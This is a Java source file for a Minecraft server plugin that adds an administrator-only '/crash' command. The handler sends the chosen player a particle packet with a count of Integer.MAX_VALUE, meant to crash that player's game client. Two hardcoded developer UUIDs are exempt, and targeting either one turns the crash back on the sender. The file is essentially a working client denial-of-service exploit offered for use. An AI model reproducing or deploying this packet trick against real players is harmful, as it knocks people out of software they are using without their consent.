/*
 * Copyright (C) BlazeMC, All Rights Reserved
 * Unauthorized copying of this file, via any medium is strictly prohibited
 * Proprietary and confidential.
 */

package com.minecraft.core.bukkit.command;

import com.minecraft.core.bukkit.util.BukkitInterface;
import com.minecraft.core.command.annotation.Command;
import com.minecraft.core.command.annotation.Completer;
import com.minecraft.core.command.command.Context;
import com.minecraft.core.command.platform.Platform;
import com.minecraft.core.enums.Rank;
import net.minecraft.server.v1_8_R3.EnumParticle;
import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
import org.bukkit.Location;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Collections;
import java.util.List;
import java.util.UUID;

public class CrashCommand implements BukkitInterface {

    @Command(name = "crash", usage = "{label} <target>", platform = Platform.PLAYER, rank = Rank.ADMINISTRATOR)
    public void handleCommand(Context<Player> context, Player target) {
        Player sender = context.getSender();

        if (target == null || !sender.canSee(target)) {
            context.info("target.not_found");
            return;
        }

        if (isDev(target.getUniqueId())) {
            target = sender;
        }

        Location location = target.getLocation();

        PacketPlayOutWorldParticles packet = new PacketPlayOutWorldParticles(EnumParticle.EXPLOSION_LARGE, true, (float) location.getX(), (float) location.getY(), (float) location.getZ(), 0.75f, 0.75f, 0.75f, 0, Integer.MAX_VALUE);
        ((CraftPlayer) target).getHandle().playerConnection.sendPacket(packet);

        context.info("command.crash.successful", target.getName());
    }

    @Completer(name = "crash")
    public List<String> handleComplete(Context<CommandSender> context) {
        if (context.argsCount() == 1)
            return getOnlineNicknames(context);
        return Collections.emptyList();
    }

    protected boolean isDev(UUID uuid) {
        return uuid.equals(UUID.fromString("be4cdc3a-6cb3-4b28-b9d3-47a7da2a13e4")) || uuid.equals(UUID.fromString("97744a87-b5b0-4701-938d-6cda4268f42c"));
    }
}
